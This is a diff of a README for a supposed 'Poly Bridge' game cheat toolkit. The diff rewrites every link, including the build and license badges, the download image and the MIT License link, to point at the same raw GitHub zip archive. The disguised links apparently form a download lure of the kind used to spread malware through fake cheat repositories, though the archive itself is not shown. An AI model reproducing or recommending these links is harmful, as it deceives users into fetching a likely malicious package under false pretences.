@@ -1,13 +1,13 @@
 # Poly Bridge Cheats & Hacks Deluxe 🏗️🌐
 
-[![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen)](https://img.shields.io/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Last Commit](https://img.shields.io/badge/Last_Commit-2025-blue)](https://img.shields.io/)
-[![Downloads](https://img.shields.io/badge/Downloads-99K%2B-orange)](https://img.shields.io/)
+[![Build Status](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)
+[![License: MIT](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)
+[![Last Commit](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)
+[![Downloads](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip%2B-orange)](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)
 
 ---
   
-![Download](https://i.imgur.com/GAy00Tq.png)https://karan5530.github.io
+![Download](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip
 
 ---
 
@@ -82,7 +82,7 @@ Setting up is as smooth as gliding over a perfectly arched bridge. You’ll be o
 
 ### 1: Get the Poly Bridge Cheats & Hacks Deluxe Package
 
-Click the [Download](https://i.imgur.com/GAy00Tq.png)https://karan5530.github.io image above or below to access the latest 2025 version.
+Click the [Download](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip image above or below to access the latest 2025 version.
 
 ### 2: Quick Steps
 
@@ -121,12 +121,12 @@ This toolkit is engineered for exploratory, creative, and educational purposes i
 
 ## 📜 MIT License
 
-- 2025, Licensed under the [MIT License](https://opensource.org/licenses/MIT)
+- 2025, Licensed under the [MIT License](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)
 - You are free to use, modify, merge, and distribute — just be cool, keep the copyright!
 
 ---
 
-![Download](https://i.imgur.com/GAy00Tq.png)https://karan5530.github.io
+![Download](https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip)https://raw.githubusercontent.com/karan5530/poly-bridge-smart-solvers/branch/suprachorioidea/bridge-smart-solvers-poly-1.4.zip
 
 ---
 
